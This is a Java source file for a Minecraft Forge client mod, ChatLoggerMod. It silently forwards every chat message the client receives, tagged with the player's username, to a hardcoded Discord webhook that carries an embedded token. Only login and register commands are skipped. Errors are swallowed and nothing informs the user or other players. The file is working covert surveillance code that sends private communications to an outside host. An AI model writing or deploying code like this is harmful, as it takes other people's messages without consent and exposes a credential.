package net.mcreator.chatmod;

import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraft.client.Minecraft;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class ChatLoggerMod {

    // 
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1487893400001712199/4vA3flU8xdoxkff7A1M_Mr7HhfJQOW6e1yowFWCHCVWlfVw2VK-zN8vJor52GYiwewdW";
    private final HttpClient httpClient = HttpClient.newHttpClient();

    public ChatLoggerMod() {
        MinecraftForge.EVENT_BUS.register(this);
    }

    @SubscribeEvent
    public void onClientChat(ClientChatReceivedEvent event) {
        String text = event.getMessage().getString();
        String playerNick = Minecraft.getInstance().getUser().getName();

        // Filtr bezpieczeństwa: ignoruje hasła
        String low = text.toLowerCase();
        if (low.contains("/login") || low.contains("/l ") || 
            low.contains("/register") || low.contains("/reg ")) {
            return;
        }

        sendToDiscord("**[" + playerNick + "]** widzi: " + text);
    }

    private void sendToDiscord(String content) {
        new Thread(() -> {
            try {
                String json = "{\"content\": \"" + content.replace("\"", "\\\"").replace("\n", " ") + "\"}";
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(WEBHOOK_URL))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(json))
                        .build();
                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            } catch (Exception ignored) {}
        }).start();
    }
}
